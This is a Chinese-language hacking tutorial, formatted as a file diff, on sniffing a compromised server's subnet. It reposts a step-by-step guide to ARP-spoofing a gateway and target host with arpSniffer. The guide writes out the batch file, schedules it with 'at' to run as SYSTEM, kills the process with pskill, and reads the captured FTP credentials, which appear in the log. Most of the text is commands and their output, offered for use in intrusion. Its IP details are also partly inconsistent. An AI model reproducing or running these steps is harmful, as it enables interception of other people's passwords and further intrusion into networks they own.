@@ -1,0 +1,190 @@
+有些人拿到服务器就喜欢去抓鸡，因为服务器抓鸡快嘛。但我不喜欢，我也不会抓鸡，我喜欢继续渗透，也就是嗅探C段。
+
+传上我们的嗅探利器cain，这可是神器啊。我最喜欢的一款工具。
+
+【转】 ARP渗透内网具体步骤2010-11-19 02:42转载自 foolish_qiang最终编辑 小拇指的独奏假设想攻击的主机IP是:61.139.1.79 ,同一子网下我们已有权限的主机IP是:61.139.1.88并可以3389登陆 
+    第一步:
+
+    tracert 61.139.1.1
+
+    C:/WIN2000/system32>tracert 61.139.1.1
+
+    Tracing route to HACK-4FJ7EARC [61.139.1.1]
+
+    over a maximum of 30 hops:
+
+    1 <10 ms <10 ms <10 ms HACK-4FJ7EARC [61.139.1.1]
+
+    Trace complete.
+
+    这就说明了你想攻击的主机和你所在的主机在一个关网中那么就有可能
+
+    进行arpSniffer了
+
+    第二步:看本机IP设置和网卡情况
+
+    C:/WIN2000/system32>ipconfig /all
+
+    Windows 2000 IP Configuration
+
+    Host Name . . . . . . . . . . . . : smscomputer
+
+    Primary DNS Suffix . . . . . . . :
+
+    Node Type . . . . . . . . . . . . : Broadcast
+
+    IP Routing Enabled. . . . . . . . : No
+
+    WINS Proxy Enabled. . . . . . . . : No
+
+    Ethernet adapter Intel Fast Ethernet LAN Controller - onboard:
+
+    Connection-specific DNS Suffix . :
+
+    Description . . . . . . . . . . . : Intel(R) 8255x Based Network Connection
+
+    Physical Address. . . . . . . . . : 00-B0-D0-22-10-C6
+
+    DHCP Enabled. . . . . . . . . . . : No
+
+    IP Address. . . . . . . . . . . . : 61.139.1.2
+
+    Subnet Mask . . . . . . . . . . . : 255.255.255.0
+
+    Default Gateway . . . . . . . . . : 61.139.1.65
+
+    DNS Servers . . . . . . . . . . . : 61.139.1.73
+
+    说明只有一块网卡那么在执行arpSniffer的时候就可以不要第五个参数了这个地
+
+    方小榕的主页可没有说哟,经过测试我发觉如果只有一块网卡你第五个参数使用0
+
+    的话也只能嗅探到通过自已的数据哟.
+
+    从上面我们还可以知道网关是61.139.1.65
+
+    第三步:查看本机时间
+
+    C:/WIN2000/system32>net time //127.0.0.1
+
+    //127.0.0.1 的当前时间是 2003/1/28 下午 09:13
+
+    命令完成成功
+
+    要注意的是这儿的时间是12小时式,用at命令应要24小时式
+
+    第四步:编写启动arpSniffer的bat文件
+
+    C:/WIN2000/system32>echo arpSniffer 61.139.1.65 61.139.1.79 21 1.txt /reset>c:/winnt/a.bat
+
+    注意咯我们没有要第五个参数,如果有多个网卡的话你就要先直接执行arpSniffer显示如下:
+
+    arpSniffer 0.5 (Router Inside), by netXeyes, Special Thanks BB
+
+    www.netXeyes.com 2002, security@vip.sina.com
+
+    Network Adapter 0: D-Link DE-528 Ethernet PCI Adapter
+
+    Network Adapter 1: Intel(R) PRO/100+ PCI Adapter(这个地方选第五个参数)
+
+    Usage: arpSniffer [/RESET]
+
+    第五步:后台运行开始嗅探咯
+
+    C:/winnt/system32>at //127.0.0.1 20:44 c:/winnt/a.bat
+
+    注意:这儿的时间要用24小时式
+
+    arpSniffer最好拷到system32目录下,记录文件也会生成在这儿
+
+    执行完第四步要先安装WINPCAP 2.1驱动
+
+    同时arpSniffer要使用最新的0.5版,老版本有不少BUG而且要改注册表重启机子
+
+    第六步:看密码但是生成的记录文件不能直接看也不能拷贝所以我们只能先结束掉
+
+    以SYSTEM权限启动的arpSniffer程序
+
+    C:/winnt/system32>pulist
+
+    ...................
+
+    conime.exe 248 NT AUTHORITY/SYSTEM
+
+    explorer.exe 1864 SMSCOMPUTER/Administrator
+
+    CSRSS.EXE 2256 NT AUTHORITY/SYSTEM
+
+    arpSniffer.exe 2322 NT AUTHORITY/SYSTEM ----就是它了!
+
+    WINLOGON.EXE 2344 NT AUTHORITY/SYSTEM
+
+    ......................
+
+    杀了它
+
+    C:/winnt/system32>pskill 2322
+
+    PsKill v1.03 - local and remote process killer
+
+    Copyright (C) 2000 Mark Russinovich
+
+    http://www.sysinternals.com
+
+    Process 2322 killed.
+
+    C:/winnt/system32>type 1.txt 我的例子中嗅探的是FTP密码:)
+
+    ...............
+
+    61.188.218.179(1404)->61.139.1.79(21)PASS aaabbb
+
+    61.139.1.79(21)->61.188.218.179(1404)530 User czy82 cannot log in.
+
+    61.139.1.79(21)->61.188.218.179(1404)530 User czy82 cannot log in.
+
+    61.188.218.179(1404)->61.139.1.79(21)QUIT
+
+    61.188.218.179(1404)->61.139.1.79(21)QUIT
+
+    61.139.1.79(21)->61.188.218.179(1404)221
+
+    61.139.1.79(21)->61.188.218.179(1404)221
+
+    ............
+
+    ............
+
+    特别要注意的就是PASS哈:)
+
+    ----------------------------------------------------
+
+    付录:
+
+    前台正常执行的显示
+
+    C:/>arpSniffer 61.139.1.65 61.139.1.79 21 1.txt /reset
+
+    arpSniffer 0.5 (Router Inside), by netXeyes, Special Thanks BB
+
+    www.netXeyes.com 2002, security@vip.sina.com
+
+    Network Adapter 0: Intel(R) 8255x Based Network Connection
+
+    Enable IP Router....OK
+
+    Get 61.139.1.65 Hardware Address: 00-00-0c-07-ac-02
+
+    Get 61.139.1.79 Hardware Address: 00-b0-d0-22-10-cb
+
+    Get 61.139.1.88 Hardware Address: 00-b0-d0-22-10-c6
+
+    Spoof 61.139.1.79: Mac of 61.139.1.65 ===> Mac of 61.139.1.88
+
+    Spoof 61.139.1.65: Mac of 61.139.1.79 ===> Mac of 61.139.1.88
+
+    有时这儿要先显示can not open driver(0)不管它等一下就可以了
+
+    Begin Sniffer.........
+ 
+
